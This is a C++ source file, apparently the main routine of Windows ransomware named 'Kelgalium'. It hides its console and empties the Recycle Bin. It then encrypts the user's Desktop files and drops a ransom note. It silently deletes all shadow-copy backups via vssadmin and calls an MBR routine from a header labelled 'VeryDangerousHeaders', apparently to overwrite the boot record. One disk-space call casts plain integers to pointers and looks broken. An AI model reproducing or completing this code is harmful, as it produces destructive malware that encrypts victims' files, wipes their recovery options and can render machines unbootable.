#include "Start_Encryption.h"
#include <windows.h>
#include <Lmcons.h>
#include "../VeryDangerousHeaders/MBR.h"


int main() 
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	SetProcessShutdownParameters(0, 0);
	SHEmptyRecycleBinW(NULL, NULL, 7);
	KelgaliumPayloads::SearchFiles((WCHAR*)L"C:\\Users\\%USERNAME%\\Desktop", 0x0);
	Kelgalium::StartEncryption((WCHAR*)L"C:\\Users\\%USERNAME%\\Desktop");
	KelgaliumPayloads::CreateNote();
	Sleep(5500);
	ShellExecuteW(NULL, L"open", L"cmd.exe", L"/c vssadmin.exe delete shadows /all /quiet", 0, SW_HIDE);
	ShellExecuteW(NULL, L"open", L"cmd.exe", L"/c notepad C:\\Temp\\Note.txt", 0, SW_HIDE);
	if (GetDiskFreeSpaceA("C:\\", (LPDWORD)512, (LPDWORD)615, (LPDWORD)512, (LPDWORD)1)) 
	{
		MoveWindow(GetConsoleWindow(), 5, 5, 12, 155, 0);
	}
	MBR();
	return 0;
}